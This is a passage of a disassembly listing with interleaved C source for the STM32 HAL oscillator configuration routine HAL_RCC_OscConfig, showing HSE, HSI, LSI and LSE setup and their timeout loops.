 8003cbe:	e025      	b.n	8003d0c <HAL_RCC_OscConfig+0x298>
 8003cc0:	687b      	ldr	r3, [r7, #4]
 8003cc2:	685b      	ldr	r3, [r3, #4]
 8003cc4:	f5b3 2fa0 	cmp.w	r3, #327680	; 0x50000
 8003cc8:	d114      	bne.n	8003cf4 <HAL_RCC_OscConfig+0x280>
 8003cca:	4b06      	ldr	r3, [pc, #24]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003ccc:	681b      	ldr	r3, [r3, #0]
 8003cce:	4a05      	ldr	r2, [pc, #20]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003cd0:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8003cd4:	6013      	str	r3, [r2, #0]
 8003cd6:	4b03      	ldr	r3, [pc, #12]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003cd8:	681b      	ldr	r3, [r3, #0]
 8003cda:	4a02      	ldr	r2, [pc, #8]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003cdc:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003ce0:	6013      	str	r3, [r2, #0]
 8003ce2:	e013      	b.n	8003d0c <HAL_RCC_OscConfig+0x298>
 8003ce4:	40021000 	.word	0x40021000
 8003ce8:	0800d3ec 	.word	0x0800d3ec
 8003cec:	20000000 	.word	0x20000000
 8003cf0:	20000004 	.word	0x20000004
 8003cf4:	4ba0      	ldr	r3, [pc, #640]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003cf6:	681b      	ldr	r3, [r3, #0]
 8003cf8:	4a9f      	ldr	r2, [pc, #636]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003cfa:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8003cfe:	6013      	str	r3, [r2, #0]
 8003d00:	4b9d      	ldr	r3, [pc, #628]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003d02:	681b      	ldr	r3, [r3, #0]
 8003d04:	4a9c      	ldr	r2, [pc, #624]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003d06:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 8003d0a:	6013      	str	r3, [r2, #0]

      /* Check the HSE State */
      if(RCC_OscInitStruct->HSEState != RCC_HSE_OFF)
 8003d0c:	687b      	ldr	r3, [r7, #4]
 8003d0e:	685b      	ldr	r3, [r3, #4]
 8003d10:	2b00      	cmp	r3, #0
 8003d12:	d013      	beq.n	8003d3c <HAL_RCC_OscConfig+0x2c8>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003d14:	f7fd fb2a 	bl	800136c <HAL_GetTick>
 8003d18:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003d1a:	e008      	b.n	8003d2e <HAL_RCC_OscConfig+0x2ba>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003d1c:	f7fd fb26 	bl	800136c <HAL_GetTick>
 8003d20:	4602      	mov	r2, r0
 8003d22:	693b      	ldr	r3, [r7, #16]
 8003d24:	1ad3      	subs	r3, r2, r3
 8003d26:	2b64      	cmp	r3, #100	; 0x64
 8003d28:	d901      	bls.n	8003d2e <HAL_RCC_OscConfig+0x2ba>
          {
            return HAL_TIMEOUT;
 8003d2a:	2303      	movs	r3, #3
 8003d2c:	e2ae      	b.n	800428c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003d2e:	4b92      	ldr	r3, [pc, #584]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003d30:	681b      	ldr	r3, [r3, #0]
 8003d32:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003d36:	2b00      	cmp	r3, #0
 8003d38:	d0f0      	beq.n	8003d1c <HAL_RCC_OscConfig+0x2a8>
 8003d3a:	e014      	b.n	8003d66 <HAL_RCC_OscConfig+0x2f2>
        }
      }
      else
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003d3c:	f7fd fb16 	bl	800136c <HAL_GetTick>
 8003d40:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003d42:	e008      	b.n	8003d56 <HAL_RCC_OscConfig+0x2e2>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003d44:	f7fd fb12 	bl	800136c <HAL_GetTick>
 8003d48:	4602      	mov	r2, r0
 8003d4a:	693b      	ldr	r3, [r7, #16]
 8003d4c:	1ad3      	subs	r3, r2, r3
 8003d4e:	2b64      	cmp	r3, #100	; 0x64
 8003d50:	d901      	bls.n	8003d56 <HAL_RCC_OscConfig+0x2e2>
          {
            return HAL_TIMEOUT;
 8003d52:	2303      	movs	r3, #3
 8003d54:	e29a      	b.n	800428c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003d56:	4b88      	ldr	r3, [pc, #544]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003d58:	681b      	ldr	r3, [r3, #0]
 8003d5a:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003d5e:	2b00      	cmp	r3, #0
 8003d60:	d1f0      	bne.n	8003d44 <HAL_RCC_OscConfig+0x2d0>
 8003d62:	e000      	b.n	8003d66 <HAL_RCC_OscConfig+0x2f2>
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003d64:	bf00      	nop
        }
      }
    }
  }
  /*----------------------------- HSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)
 8003d66:	687b      	ldr	r3, [r7, #4]
 8003d68:	681b      	ldr	r3, [r3, #0]
 8003d6a:	f003 0302 	and.w	r3, r3, #2
 8003d6e:	2b00      	cmp	r3, #0
 8003d70:	d060      	beq.n	8003e34 <HAL_RCC_OscConfig+0x3c0>
    /* Check the parameters */
    assert_param(IS_RCC_HSI(RCC_OscInitStruct->HSIState));
    assert_param(IS_RCC_HSI_CALIBRATION_VALUE(RCC_OscInitStruct->HSICalibrationValue));

    /* Check if HSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_HSI) ||
 8003d72:	69bb      	ldr	r3, [r7, #24]
 8003d74:	2b04      	cmp	r3, #4
 8003d76:	d005      	beq.n	8003d84 <HAL_RCC_OscConfig+0x310>
 8003d78:	69bb      	ldr	r3, [r7, #24]
 8003d7a:	2b0c      	cmp	r3, #12
 8003d7c:	d119      	bne.n	8003db2 <HAL_RCC_OscConfig+0x33e>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSI)))
 8003d7e:	697b      	ldr	r3, [r7, #20]
 8003d80:	2b02      	cmp	r3, #2
 8003d82:	d116      	bne.n	8003db2 <HAL_RCC_OscConfig+0x33e>
    {
      /* When HSI is used as system clock it will not be disabled */
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003d84:	4b7c      	ldr	r3, [pc, #496]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003d86:	681b      	ldr	r3, [r3, #0]
 8003d88:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003d8c:	2b00      	cmp	r3, #0
 8003d8e:	d005      	beq.n	8003d9c <HAL_RCC_OscConfig+0x328>
 8003d90:	687b      	ldr	r3, [r7, #4]
 8003d92:	68db      	ldr	r3, [r3, #12]
 8003d94:	2b00      	cmp	r3, #0
 8003d96:	d101      	bne.n	8003d9c <HAL_RCC_OscConfig+0x328>
      {
        return HAL_ERROR;
 8003d98:	2301      	movs	r3, #1
 8003d9a:	e277      	b.n	800428c <HAL_RCC_OscConfig+0x818>
      }
      /* Otherwise, just the calibration is allowed */
      else
      {
        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003d9c:	4b76      	ldr	r3, [pc, #472]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003d9e:	685b      	ldr	r3, [r3, #4]
 8003da0:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003da4:	687b      	ldr	r3, [r7, #4]
 8003da6:	691b      	ldr	r3, [r3, #16]
 8003da8:	061b      	lsls	r3, r3, #24
 8003daa:	4973      	ldr	r1, [pc, #460]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003dac:	4313      	orrs	r3, r2
 8003dae:	604b      	str	r3, [r1, #4]
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003db0:	e040      	b.n	8003e34 <HAL_RCC_OscConfig+0x3c0>
      }
    }
    else
    {
      /* Check the HSI State */
      if(RCC_OscInitStruct->HSIState != RCC_HSI_OFF)
 8003db2:	687b      	ldr	r3, [r7, #4]
 8003db4:	68db      	ldr	r3, [r3, #12]
 8003db6:	2b00      	cmp	r3, #0
 8003db8:	d023      	beq.n	8003e02 <HAL_RCC_OscConfig+0x38e>
      {
        /* Enable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_ENABLE();
 8003dba:	4b6f      	ldr	r3, [pc, #444]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003dbc:	681b      	ldr	r3, [r3, #0]
 8003dbe:	4a6e      	ldr	r2, [pc, #440]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003dc0:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003dc4:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003dc6:	f7fd fad1 	bl	800136c <HAL_GetTick>
 8003dca:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003dcc:	e008      	b.n	8003de0 <HAL_RCC_OscConfig+0x36c>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003dce:	f7fd facd 	bl	800136c <HAL_GetTick>
 8003dd2:	4602      	mov	r2, r0
 8003dd4:	693b      	ldr	r3, [r7, #16]
 8003dd6:	1ad3      	subs	r3, r2, r3
 8003dd8:	2b02      	cmp	r3, #2
 8003dda:	d901      	bls.n	8003de0 <HAL_RCC_OscConfig+0x36c>
          {
            return HAL_TIMEOUT;
 8003ddc:	2303      	movs	r3, #3
 8003dde:	e255      	b.n	800428c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003de0:	4b65      	ldr	r3, [pc, #404]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003de2:	681b      	ldr	r3, [r3, #0]
 8003de4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003de8:	2b00      	cmp	r3, #0
 8003dea:	d0f0      	beq.n	8003dce <HAL_RCC_OscConfig+0x35a>
          }
        }

        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003dec:	4b62      	ldr	r3, [pc, #392]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003dee:	685b      	ldr	r3, [r3, #4]
 8003df0:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003df4:	687b      	ldr	r3, [r7, #4]
 8003df6:	691b      	ldr	r3, [r3, #16]
 8003df8:	061b      	lsls	r3, r3, #24
 8003dfa:	495f      	ldr	r1, [pc, #380]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003dfc:	4313      	orrs	r3, r2
 8003dfe:	604b      	str	r3, [r1, #4]
 8003e00:	e018      	b.n	8003e34 <HAL_RCC_OscConfig+0x3c0>
      }
      else
      {
        /* Disable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_DISABLE();
 8003e02:	4b5d      	ldr	r3, [pc, #372]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003e04:	681b      	ldr	r3, [r3, #0]
 8003e06:	4a5c      	ldr	r2, [pc, #368]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003e08:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 8003e0c:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003e0e:	f7fd faad 	bl	800136c <HAL_GetTick>
 8003e12:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003e14:	e008      	b.n	8003e28 <HAL_RCC_OscConfig+0x3b4>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003e16:	f7fd faa9 	bl	800136c <HAL_GetTick>
 8003e1a:	4602      	mov	r2, r0
 8003e1c:	693b      	ldr	r3, [r7, #16]
 8003e1e:	1ad3      	subs	r3, r2, r3
 8003e20:	2b02      	cmp	r3, #2
 8003e22:	d901      	bls.n	8003e28 <HAL_RCC_OscConfig+0x3b4>
          {
            return HAL_TIMEOUT;
 8003e24:	2303      	movs	r3, #3
 8003e26:	e231      	b.n	800428c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003e28:	4b53      	ldr	r3, [pc, #332]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003e2a:	681b      	ldr	r3, [r3, #0]
 8003e2c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003e30:	2b00      	cmp	r3, #0
 8003e32:	d1f0      	bne.n	8003e16 <HAL_RCC_OscConfig+0x3a2>
        }
      }
    }
  }
  /*------------------------------ LSI Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)
 8003e34:	687b      	ldr	r3, [r7, #4]
 8003e36:	681b      	ldr	r3, [r3, #0]
 8003e38:	f003 0308 	and.w	r3, r3, #8
 8003e3c:	2b00      	cmp	r3, #0
 8003e3e:	d03c      	beq.n	8003eba <HAL_RCC_OscConfig+0x446>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LSI(RCC_OscInitStruct->LSIState));

    /* Check the LSI State */
    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)
 8003e40:	687b      	ldr	r3, [r7, #4]
 8003e42:	695b      	ldr	r3, [r3, #20]
 8003e44:	2b00      	cmp	r3, #0
 8003e46:	d01c      	beq.n	8003e82 <HAL_RCC_OscConfig+0x40e>
        MODIFY_REG(RCC->CSR, RCC_CSR_LSIPREDIV, RCC_OscInitStruct->LSIDiv);
      }
#endif /* RCC_CSR_LSIPREDIV */

      /* Enable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_ENABLE();
 8003e48:	4b4b      	ldr	r3, [pc, #300]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003e4a:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003e4e:	4a4a      	ldr	r2, [pc, #296]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003e50:	f043 0301 	orr.w	r3, r3, #1
 8003e54:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e58:	f7fd fa88 	bl	800136c <HAL_GetTick>
 8003e5c:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is ready */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003e5e:	e008      	b.n	8003e72 <HAL_RCC_OscConfig+0x3fe>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003e60:	f7fd fa84 	bl	800136c <HAL_GetTick>
 8003e64:	4602      	mov	r2, r0
 8003e66:	693b      	ldr	r3, [r7, #16]
 8003e68:	1ad3      	subs	r3, r2, r3
 8003e6a:	2b02      	cmp	r3, #2
 8003e6c:	d901      	bls.n	8003e72 <HAL_RCC_OscConfig+0x3fe>
        {
          return HAL_TIMEOUT;
 8003e6e:	2303      	movs	r3, #3
 8003e70:	e20c      	b.n	800428c <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003e72:	4b41      	ldr	r3, [pc, #260]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003e74:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003e78:	f003 0302 	and.w	r3, r3, #2
 8003e7c:	2b00      	cmp	r3, #0
 8003e7e:	d0ef      	beq.n	8003e60 <HAL_RCC_OscConfig+0x3ec>
 8003e80:	e01b      	b.n	8003eba <HAL_RCC_OscConfig+0x446>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_DISABLE();
 8003e82:	4b3d      	ldr	r3, [pc, #244]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003e84:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003e88:	4a3b      	ldr	r2, [pc, #236]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003e8a:	f023 0301 	bic.w	r3, r3, #1
 8003e8e:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e92:	f7fd fa6b 	bl	800136c <HAL_GetTick>
 8003e96:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is disabled */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003e98:	e008      	b.n	8003eac <HAL_RCC_OscConfig+0x438>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003e9a:	f7fd fa67 	bl	800136c <HAL_GetTick>
 8003e9e:	4602      	mov	r2, r0
 8003ea0:	693b      	ldr	r3, [r7, #16]
 8003ea2:	1ad3      	subs	r3, r2, r3
 8003ea4:	2b02      	cmp	r3, #2
 8003ea6:	d901      	bls.n	8003eac <HAL_RCC_OscConfig+0x438>
        {
          return HAL_TIMEOUT;
 8003ea8:	2303      	movs	r3, #3
 8003eaa:	e1ef      	b.n	800428c <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003eac:	4b32      	ldr	r3, [pc, #200]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003eae:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003eb2:	f003 0302 	and.w	r3, r3, #2
 8003eb6:	2b00      	cmp	r3, #0
 8003eb8:	d1ef      	bne.n	8003e9a <HAL_RCC_OscConfig+0x426>
        }
      }
    }
  }
  /*------------------------------ LSE Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)
 8003eba:	687b      	ldr	r3, [r7, #4]
 8003ebc:	681b      	ldr	r3, [r3, #0]
 8003ebe:	f003 0304 	and.w	r3, r3, #4
 8003ec2:	2b00      	cmp	r3, #0
 8003ec4:	f000 80a6 	beq.w	8004014 <HAL_RCC_OscConfig+0x5a0>
  {
    FlagStatus       pwrclkchanged = RESET;
 8003ec8:	2300      	movs	r3, #0
 8003eca:	77fb      	strb	r3, [r7, #31]
    /* Check the parameters */
    assert_param(IS_RCC_LSE(RCC_OscInitStruct->LSEState));

    /* Update LSE configuration in Backup Domain control register    */
    /* Requires to enable write access to Backup Domain of necessary */
    if(HAL_IS_BIT_CLR(RCC->APB1ENR1, RCC_APB1ENR1_PWREN))
 8003ecc:	4b2a      	ldr	r3, [pc, #168]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003ece:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003ed0:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003ed4:	2b00      	cmp	r3, #0
 8003ed6:	d10d      	bne.n	8003ef4 <HAL_RCC_OscConfig+0x480>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8003ed8:	4b27      	ldr	r3, [pc, #156]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003eda:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003edc:	4a26      	ldr	r2, [pc, #152]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003ede:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8003ee2:	6593      	str	r3, [r2, #88]	; 0x58
 8003ee4:	4b24      	ldr	r3, [pc, #144]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003ee6:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003ee8:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003eec:	60bb      	str	r3, [r7, #8]
 8003eee:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8003ef0:	2301      	movs	r3, #1
 8003ef2:	77fb      	strb	r3, [r7, #31]
    }

    if(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003ef4:	4b21      	ldr	r3, [pc, #132]	; (8003f7c <HAL_RCC_OscConfig+0x508>)
 8003ef6:	681b      	ldr	r3, [r3, #0]
 8003ef8:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003efc:	2b00      	cmp	r3, #0
 8003efe:	d118      	bne.n	8003f32 <HAL_RCC_OscConfig+0x4be>
    {
      /* Enable write access to Backup domain */
      SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003f00:	4b1e      	ldr	r3, [pc, #120]	; (8003f7c <HAL_RCC_OscConfig+0x508>)
 8003f02:	681b      	ldr	r3, [r3, #0]
 8003f04:	4a1d      	ldr	r2, [pc, #116]	; (8003f7c <HAL_RCC_OscConfig+0x508>)
 8003f06:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003f0a:	6013      	str	r3, [r2, #0]

      /* Wait for Backup domain Write protection disable */
      tickstart = HAL_GetTick();
 8003f0c:	f7fd fa2e 	bl	800136c <HAL_GetTick>
 8003f10:	6138      	str	r0, [r7, #16]

      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003f12:	e008      	b.n	8003f26 <HAL_RCC_OscConfig+0x4b2>
      {
        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8003f14:	f7fd fa2a 	bl	800136c <HAL_GetTick>
 8003f18:	4602      	mov	r2, r0
 8003f1a:	693b      	ldr	r3, [r7, #16]
 8003f1c:	1ad3      	subs	r3, r2, r3
 8003f1e:	2b02      	cmp	r3, #2
 8003f20:	d901      	bls.n	8003f26 <HAL_RCC_OscConfig+0x4b2>
        {
          return HAL_TIMEOUT;
 8003f22:	2303      	movs	r3, #3
 8003f24:	e1b2      	b.n	800428c <HAL_RCC_OscConfig+0x818>
      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003f26:	4b15      	ldr	r3, [pc, #84]	; (8003f7c <HAL_RCC_OscConfig+0x508>)
 8003f28:	681b      	ldr	r3, [r3, #0]
 8003f2a:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003f2e:	2b00      	cmp	r3, #0
 8003f30:	d0f0      	beq.n	8003f14 <HAL_RCC_OscConfig+0x4a0>
    {
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEON);
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEBYP);
    }
#else
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8003f32:	687b      	ldr	r3, [r7, #4]
 8003f34:	689b      	ldr	r3, [r3, #8]
 8003f36:	2b01      	cmp	r3, #1
 8003f38:	d108      	bne.n	8003f4c <HAL_RCC_OscConfig+0x4d8>
 8003f3a:	4b0f      	ldr	r3, [pc, #60]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003f3c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003f40:	4a0d      	ldr	r2, [pc, #52]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003f42:	f043 0301 	orr.w	r3, r3, #1
 8003f46:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003f4a:	e029      	b.n	8003fa0 <HAL_RCC_OscConfig+0x52c>
 8003f4c:	687b      	ldr	r3, [r7, #4]
 8003f4e:	689b      	ldr	r3, [r3, #8]
 8003f50:	2b05      	cmp	r3, #5
 8003f52:	d115      	bne.n	8003f80 <HAL_RCC_OscConfig+0x50c>
 8003f54:	4b08      	ldr	r3, [pc, #32]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003f56:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003f5a:	4a07      	ldr	r2, [pc, #28]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003f5c:	f043 0304 	orr.w	r3, r3, #4
 8003f60:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003f64:	4b04      	ldr	r3, [pc, #16]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003f66:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003f6a:	4a03      	ldr	r2, [pc, #12]	; (8003f78 <HAL_RCC_OscConfig+0x504>)
 8003f6c:	f043 0301 	orr.w	r3, r3, #1
 8003f70:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003f74:	e014      	b.n	8003fa0 <HAL_RCC_OscConfig+0x52c>
 8003f76:	bf00      	nop
 8003f78:	40021000 	.word	0x40021000
 8003f7c:	40007000 	.word	0x40007000
 8003f80:	4b9a      	ldr	r3, [pc, #616]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8003f82:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003f86:	4a99      	ldr	r2, [pc, #612]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8003f88:	f023 0301 	bic.w	r3, r3, #1
 8003f8c:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003f90:	4b96      	ldr	r3, [pc, #600]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8003f92:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003f96:	4a95      	ldr	r2, [pc, #596]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8003f98:	f023 0304 	bic.w	r3, r3, #4
 8003f9c:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
#endif /* RCC_BDCR_LSESYSDIS */

    /* Check the LSE State */
    if(RCC_OscInitStruct->LSEState != RCC_LSE_OFF)
 8003fa0:	687b      	ldr	r3, [r7, #4]
 8003fa2:	689b      	ldr	r3, [r3, #8]
 8003fa4:	2b00      	cmp	r3, #0
 8003fa6:	d016      	beq.n	8003fd6 <HAL_RCC_OscConfig+0x562>
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003fa8:	f7fd f9e0 	bl	800136c <HAL_GetTick>
 8003fac:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is ready */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003fae:	e00a      	b.n	8003fc6 <HAL_RCC_OscConfig+0x552>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003fb0:	f7fd f9dc 	bl	800136c <HAL_GetTick>
 8003fb4:	4602      	mov	r2, r0
 8003fb6:	693b      	ldr	r3, [r7, #16]
 8003fb8:	1ad3      	subs	r3, r2, r3
 8003fba:	f241 3288 	movw	r2, #5000	; 0x1388
 8003fbe:	4293      	cmp	r3, r2
 8003fc0:	d901      	bls.n	8003fc6 <HAL_RCC_OscConfig+0x552>
        {
          return HAL_TIMEOUT;
 8003fc2:	2303      	movs	r3, #3
 8003fc4:	e162      	b.n	800428c <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003fc6:	4b89      	ldr	r3, [pc, #548]	; (80041ec <HAL_RCC_OscConfig+0x778>)
 8003fc8:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003fcc:	f003 0302 	and.w	r3, r3, #2
 8003fd0:	2b00      	cmp	r3, #0
 8003fd2:	d0ed      	beq.n	8003fb0 <HAL_RCC_OscConfig+0x53c>
 8003fd4:	e015      	b.n	8004002 <HAL_RCC_OscConfig+0x58e>
      }
    }
    else
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003fd6:	f7fd f9c9 	bl	800136c <HAL_GetTick>
 8003fda:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is disabled */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003fdc:	e00a      	b.n	8003ff4 <HAL_RCC_OscConfig+0x580>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003fde:	f7fd f9c5 	bl	800136c <HAL_GetTick>
 8003fe2:	4602      	mov	r2, r0
 8003fe4:	693b      	ldr	r3, [r7, #16]
 8003fe6:	1ad3      	subs	r3, r2, r3
 8003fe8:	f241 3288 	movw	r2, #5000	; 0x1388
 8003fec:	4293      	cmp	r3, r2
 8003fee:	d901      	bls.n	8003ff4 <HAL_RCC_OscConfig+0x580>
        {
          return HAL_TIMEOUT;
 8003ff0:	2303      	movs	r3, #3
 8003ff2:	e14b      	b.n	800428c <HAL_RCC_OscConfig+0x818>
